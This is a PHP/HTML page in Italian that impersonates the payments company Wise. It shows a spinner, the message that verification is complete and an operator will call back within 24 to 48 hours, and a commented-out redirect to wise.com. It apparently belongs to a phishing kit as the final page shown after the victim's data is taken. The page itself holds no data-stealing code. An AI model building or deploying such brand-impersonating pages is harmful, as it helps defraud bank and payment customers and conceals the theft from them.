<?php
session_start();
?>
<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Conferma in corso - Wise</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body class="bg-white h-screen flex flex-col justify-between m-0 p-0 overflow-hidden">

    <!-- Top Bar -->
    <div class="w-full flex justify-between items-center px-6 py-4 border-b border-gray-100 bg-white shrink-0">
        <img src="_assets/logo.png" width="85" class="object-contain block">
    </div>

    <!-- Main Content Container -->
    <div class="w-full max-w-[390px] mx-auto px-6 py-6 flex flex-col items-center justify-center text-center gap-5 my-auto">
        
        <!-- Spinner -->
        <div class="w-10 h-10 border-2 border-gray-200 border-t-gray-900 rounded-full animate-spin"></div>

        <!-- Titles & Message -->
        <div class="flex flex-col gap-2">
            <h1 class="text-xl font-bold text-gray-900 tracking-tight">Verifica in corso</h1>
            <p class="text-xs text-gray-600 font-medium leading-relaxed">
                Ha completato tutto il processo di verifica, verrà ricontattato da un nostro operatore entro 24/48h.
            </p>
        </div>

    </div>

    <!-- Footer -->
    <div class="w-full text-center py-3 bg-[#f3f4f6] text-gray-500 text-xs font-medium border-t border-gray-200 shrink-0">
        © Wise Payments Limited 2026
    </div>

<script>
$(document).ready(function() {
    setTimeout(function() {
        // window.location.href = "https://wise.com";
    }, 5000);
});
</script>
</body>
</html>